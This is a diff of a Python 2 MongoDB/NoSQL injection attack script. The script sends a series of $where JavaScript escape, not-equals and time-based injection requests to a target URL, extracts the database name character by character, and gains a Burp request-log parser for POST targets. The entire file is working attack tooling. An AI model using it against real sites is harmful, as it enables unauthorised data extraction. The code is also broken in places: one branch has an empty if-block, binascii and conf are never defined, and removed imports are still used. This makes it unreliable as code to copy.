@@ -1,67 +1,105 @@
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
 # __author__: sixwhale
-from pymongo import MongoClient
-import requests
-import sys
+import codecs
 import getopt
-import time
-import string
+import inspect
+import os
 import random
-from globalvalue import GlobalValue
-from colorama import Fore, Back, Style, init
-init(autoreset=True)
+import re
+import requests
+import string
+import sys
+import time
+
+from Lib.common import checkFile
+from Lib.common import extractRegexResult
+from Lib.common import filterStringValue
+from Lib.common import getPublicTypeMembers
+from Lib.common import getUnicode
+from Lib.common import isListLike
+from Lib.common import openFile
+from Lib.common import printErrMsg
+from Lib.common import printInfoMsg
+from Lib.enums import HTTPMETHOD
+from Lib.enums import HTTP_HEADER
+from Lib.setting import BURP_REQUEST_REGEX
+from Lib.setting import BURP_XML_HISTORY_REGEX
+from Lib.setting import CRAWL_EXCLUDE_EXTENSIONS
+from Lib.setting import CUSTOM_INJECTION_MARK_CHAR
+from Lib.setting import HEADERS
+from Lib.setting import PROBLEMATIC_CUSTOM_INJECTION_PATTERNS
+from Lib.setting import TAG_NO
+from Lib.setting import TAG_YES
+
+from pymongo import MongoClient
 
 
-no_tag = GlobalValue.no_tag
-yes_tag = GlobalValue.yes_tag
-headers = GlobalValue.headers
 
-def InjectOption(url):
-	print url
-	httpMethod = raw_input(Fore.CYAN + '[*] Set HTTP method (GET/POST): ')
-	if httpMethod.lower() == 'get':
-		getWeb(url,headers)
-	elif httpMethod.lower() == 'post':
-		print '[*] postWeb function is testing...'
+def InjectOption(url, reqFile):
+	if url == None:
+
+		#postWeb(reqFile)
+	elif reqFile == None:
+		getWeb(url)
 	else:
-		print(Fore.RED +'[Error] httpmethod is unvalid......')
-		return 
+		printErrMsg('[Error] Check the required arguments......')
+		return
 
-def getWeb(url,headers):
+def postWeb(reqFile):
+	print '[*] Start web app attacks (POST)'
+
+	global testNum
+	testNum = 1
+	global httpMethod
+	httpMethod = 'POST'
+	global possAddrs
+	possAddrs = []
+	global validAddrs
+	validAddrs = []
+	addedTargetUrls = set() 
+	appUp = False
+	strAttack = False
+	intAttack = False
+
+	checkFile(reqFile)
+	try:
+		with openFile(reqFile,'rb') as f:
+			content = f.read()
+	except:
+		printErrMsg('[Error] Something went wrong while trying to read the content of file \'%s\'' % reqFile)
+		return
+	parseBurpLog(content)
+
+
+def getWeb(url):
 	print '[*] Start web app attacks (GET)'
 	
 	global testNum
 	testNum = 1
-
 	global httpMethod
 	httpMethod = 'GET'
-
 	global possAddrs
 	possAddrs = []
-
 	global validAddrs
 	validAddrs = []
-
 	global lt24
 	lt24 = False
-
 	global str24
 	str24 = False
-
 	global int24
 	int24 = False
-
 	appUp = False
 	strAttack = False
 	intAttack = False
 
 	print '[*] Checking url if correct......'
 	if '?' not in url or '=' not in url:
-		print(Fore.RED + '[Error] No URL  parameters provided for GET request...Check your url.\n')
+		printErrMsg('[Error] No URL  parameters provided for GET request...Check your url.\n')
 		return
 	print '[*] Checking status if site at \'%s\' is up......' % url
 	try:
-		req = requests.get(url,headers=headers)
+		req = requests.get(url,headers=HEADERS)
 		resCode = req.status_code
 		#print type(resCode )
 		if resCode == 200:	
@@ -76,16 +114,16 @@ def getWeb(url,headers):
 			appUp = True
 
 		else:
-			print(Fore.RED + '[Error] Got %s code from app, check your options.' % resCode)
+			printErrMsg('[Error] Got %s code from app, check your options.' % resCode)
 	except Exception, e:
-		print(Fore.RED + '[Error] %s, looks like the server didn\'t respond, check your options.' % e)
+		printErrMsg('[Error] %s, looks like the server didn\'t respond, check your options.' % e)
 	if appUp == True:
 		injectSize = raw_input(Fore.CYAN + '[*] Input test random string size: ')
 		injectstr = getInjectStr(int(injectSize))
 
 		basedInjectUrl = buildUrl(url, injectstr)
 		print '[*] Based inject url is %s' % basedInjectUrl
-		req = requests.get(basedInjectUrl,headers=headers)
+		req = requests.get(basedInjectUrl,headers=HEADERS)
 
 		basedInjectLength = int(len(req.content))
 		print '[*] Got response length of %s' % basedInjectLength
@@ -99,7 +137,7 @@ def getWeb(url,headers):
 		#Test 1
 		print(Fore.YELLOW + '[*] Testing Mongo PHP not equals associative array injection...')
 		print '[*] Injecting %s' % urlArray[1]
-		req = requests.get(urlArray[1], headers=headers)
+		req = requests.get(urlArray[1], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
 
 		if errorcheck == False:
@@ -112,7 +150,7 @@ def getWeb(url,headers):
 		#Test 2
 		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where all Javascript string escape attack for all records...')
 		print '[*] Injecting %s' % urlArray[2]
-		req = requests.get(urlArray[2], headers=headers)
+		req = requests.get(urlArray[2], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
 
 		if errorcheck == False:
@@ -126,7 +164,7 @@ def getWeb(url,headers):
 		#Test 3
 		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where Javascript integer escape attack for all records...')
 		print '[*] Injecting %s' % urlArray[3]
-		req = requests.get(urlArray[3], headers=headers)
+		req = requests.get(urlArray[3], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
 
 		if errorcheck == False:
@@ -140,7 +178,7 @@ def getWeb(url,headers):
 		#Test 4
 		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where all Javascript string escape attack for one record...')
 		print '[*] Injecting %s' % urlArray[4]
-		req = requests.get(urlArray[4], headers=headers)
+		req = requests.get(urlArray[4], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
 
 		if errorcheck == False:
@@ -154,7 +192,7 @@ def getWeb(url,headers):
 		#Test 5
 		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where Javascript integer escape attack for one record...')
 		print '[*] Injecting %s' % urlArray[5]
-		req = requests.get(urlArray[5], headers=headers)
+		req = requests.get(urlArray[5], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
 
 		if errorcheck == False:
@@ -168,7 +206,7 @@ def getWeb(url,headers):
 		#Test 6
 		print(Fore.YELLOW + '[*] Testing Mongo this not equals string escape attack for all records...')
 		print '[*] Injecting %s' % urlArray[6]
-		req = requests.get(urlArray[6], headers=headers)
+		req = requests.get(urlArray[6], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
 
 		if errorcheck == False:
@@ -182,7 +220,7 @@ def getWeb(url,headers):
 		#Test 7
 		print(Fore.YELLOW + '[*] Testing Mongo this not equals integer escape attack for all records...')
 		print '[*] Injecting %s' % urlArray[7]
-		req = requests.get(urlArray[7], headers=headers)
+		req = requests.get(urlArray[7], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
 
 		if errorcheck == False:
@@ -196,7 +234,7 @@ def getWeb(url,headers):
 		#Test 8
 		print(Fore.YELLOW + '[*] Testing  PHP/ExpressJS > undefined attack for all records...')
 		print '[*] Injecting %s' % urlArray[8]
-		req = requests.get(urlArray[8], headers=headers)
+		req = requests.get(urlArray[8], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
 
 		if errorcheck == False:
@@ -208,11 +246,11 @@ def getWeb(url,headers):
 
 		doTimeAttack = raw_input(Fore.CYAN + '[*] Starting based time attack? (y/n)')
 
-		if doTimeAttack in yes_tag:
+		if doTimeAttack in TAG_YES:
 			#整型
 			print '[*] Starting Javascript integer escape time based injection...'	
 			startTime = time.time()
-			req = requests.get(urlArray[9], headers=headers)
+			req = requests.get(urlArray[9], headers=HEADERS)
 			page = req.content
 			endTime = time.time()
 			timeDelta = int(round(endTime - startTime,3)) - reqTime
@@ -227,7 +265,7 @@ def getWeb(url,headers):
 			#字符串
 			print '[*] Starting Javascript string escape time based injection...'
 			startTime = time.time()
-			req = requests.get(urlArray[10], headers=headers)
+			req = requests.get(urlArray[10], headers=HEADERS)
 			page = req.content
 			endTime = time.time()
 			timeDelta = int(round(endTime - startTime,3)) - reqTime
@@ -245,12 +283,12 @@ def getWeb(url,headers):
 
 		print '[+] Valid URLs:'
 		for url in validAddrs:
-			print(Fore.GREEN  +'    %s' % url)
+			printInfoMsg('    %s' % url)
 			
 		print '\n '
 		print '[+] Possible URLs:'
 		for url in possAddrs:
-			print(Fore.GREEN  +'    %s' % url)
+			printInfoMsg('    %s' % url)
 
 def errorTest(errorcheck, testNum):
 	global possAddrs #可能有效
@@ -274,7 +312,7 @@ def checkResult(baseSize,injectSize,testNum,postData):
 
 	delta = abs(baseSize-injectSize)
 	if (delta >= 100) and (injectSize != 0):
-		print(Fore.GREEN + '[*] Response varied %s bytes from random parameter value! Injection works!' % delta)
+		printInfoMsg('[*] Response varied %s bytes from random parameter value! Injection works!' % delta)
 		if httpMethod == 'GET':
 			validAddrs.append(urlArray[testNum])
 		else:
@@ -327,23 +365,21 @@ def getInjectStr(size):
 			return ''.join(random.choice(chars) for x in range(size))
         else:
         	format = True
-        	print(Fore.RED + '[Error] Invalid section.')
+        	printErrMsg('[Error] Invalid section.')
 
 
 def buildUrl(url, value):
 	global urlArray
 	urlArray = ['','','','','','','','','','','','']
-
 	paramNames = []
 	paramValues = []
-
 	injectParams = []
 
 	try:
 		split_url = url.split('?')
 		params = split_url[1].split('&')
 	except:
-		print(Fore.RED + '[Error] Not able to parse the URL and parameters. Check the url')
+		printErrMsg('[Error] Not able to parse the URL and parameters. Check the url')
 		return
 
 	for item in params:
@@ -363,7 +399,7 @@ def buildUrl(url, value):
 		for i in injectIndex.split(','):
 			injectParams.append(paramNames[int(i)-1])
 	except Exception, e:
-		print(Fore.RED + '[Error] %s. Somthing wrong... Check inject parmeters.' % e)
+		printErrMsg('[Error] %s. Somthing wrong... Check inject parmeters.' % e)
 		return 
 
 	x = 0
@@ -398,6 +434,7 @@ def buildUrl(url, value):
 
 	return urlArray[0]
 
+
 def getDBInfo():
 	getDBnameLen = False
 	getDBname = False
@@ -408,7 +445,7 @@ def getDBInfo():
 
 	chars = string.ascii_letters + string.digits
 	trueUrl = urlArray[11].replace("---","return true; var v ='!" + "&")
-	req = requests.get(urlArray[11], headers=headers)
+	req = requests.get(urlArray[11], headers=HEADERS)
 	baseLen = int(len(req.content))
 
 	print '[*] Calculating the length of the database name.'
@@ -441,3 +478,114 @@ def getDBInfo():
 		else:
 			charCount += 1
 
+
+
+def parseBurpLog(content):
+	if not re.search(BURP_REQUEST_REGEX, content, re.I | re.S):
+		if re.search(BURP_XML_HISTORY_REGEX, content, re.I | re.S):
+			reqResList = []
+			for match in re.finditer(BURP_XML_HISTORY_REGEX, content, re.I | re.S):
+				port, request = match.groups()
+				try:
+					request = request.decode("base64")
+				except binascii.Error:
+					continue
+				_ = re.search(r"%s:.+" % re.escape('Host'), request)
+				if _:
+					host = _.group(0).strip()
+					if not re.search(r":\d+\Z", host):
+						request = request.replace(host, "%s:%d" % (host, int(port)))
+				reqResList.append(request)
+		else:
+			reqResList = [content]
+	else:
+		reqResList = re.finditer(BURP_REQUEST_REGEX, content, re.I | re.S)
+	
+	for match in reqResList:
+		request = match if isinstance(match, basestring) else match.group(0)
+		request = re.sub(r"\A[^\w]+","",request)
+		schemePort = re.search(r"(http[\w]*)\:\/\/.*?\:([\d]+).+?={10,}",request, re.I | re.S)
+		if schemePort:
+			scheme = schemePort.group(1)
+			port = schemePort.group(2)
+		else:
+			scheme, port = None, None
+		print scheme, port 
+
+		if not re.search(r"^[\n]*(%s).*?\sHTTP\/" % "|".join(getPublicTypeMembers(HTTPMETHOD, True)), request, re.I | re.M):
+			continue
+		if re.search(r"^[\n]*%s.*?\.(%s)\sHTTP\/" % ('GET', "|".join(CRAWL_EXCLUDE_EXTENSIONS)), request, re.I | re.M):
+			continue
+
+		getPostReq = False
+		url = None
+		host = None
+		method = None
+		data = None
+		cookie = None
+		params = False
+		newline = None
+		lines = request.split('\n')
+		headers = []
+
+		for index in xrange(len(lines)):
+			line = lines[index]
+			if not line.strip() and index == len(lines) - 1:
+				break
+			newline = "\r\n" if line.endswith('\r') else '\n'
+			line = line.strip('\r')
+			match = re.search(r"\A(%s) (.+) HTTP/[\d.]+\Z" % "|".join(getPublicTypeMembers(HTTPMETHOD, True)), line) if not method else None
+			if len(line.strip()) == 0 and method and method != HTTPMETHOD.GET and data is None:
+				data = ''
+				params = True
+			elif match:
+				method = match.group(1)
+				url = match.group(2)
+				if any(_ in line for _ in ('?', '=', CUSTOM_INJECTION_MARK_CHAR)):
+					params = True
+				getPostReq = True
+			#POST parameters
+			elif data is not None and params:
+				data += '%s%s' % (line, newline)
+			#GET parameters
+			elif '?' in line and '=' in line and ": " not in line:
+				params = True
+			#Headers 
+			elif re.search(r"\A\S+:", line):
+				key, value = line.split(':',1)
+				value = value.strip().replace('\r','').replace('\n','')
+
+				#Cookie and Host headers
+				if key.upper() == HTTP_HEADER.COOKIE.upper():
+					cookie = value
+				elif key.upper() == HTTP_HEADER.HOST.upper():
+					if '://' in value:
+						schemePort, value = value.split('://')[:2]
+					splitValue = value.split(':')
+					host = splitValue[0]
+
+					if len(splitValue) > 1:
+							port = filterStringValue(splitValue[1], "[0-9]")
+				if key.upper() == HTTP_HEADER.CONTENT_LENGTH.upper():
+					params = True
+					headers.append((getUnicode(key), getUnicode(value)))
+				elif key not in (HTTP_HEADER.PROXY_CONNECTION, HTTP_HEADER.CONNECTION):
+					headers.append((getUnicode(key), getUnicode(value)))
+				if CUSTOM_INJECTION_MARK_CHAR in re.sub(PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, "", value or ""):
+					params = True 
+		data = data.rstrip('\r\n') if data else data
+
+		if getPostReq and (params or cookie):
+			if not port and isinstance(scheme, basestring) and scheme.lower() == 'https':
+				port = '443'
+			elif not scheme and port == '443':
+				scheme = 'https'
+			if not host:
+				printErrMsg('[Error] Invalid format of a request file')
+			if not url.startswith("http"):
+				url = "%s://%s:%s%s" % (scheme or "http", host, port or "80", url)
+				scheme, port = None, None 
+			if not(None and not re.search(conf.scope, url, re.I)):
+				print url, method, cookie, tuple(headers)
+				print '---'*10
+				print data
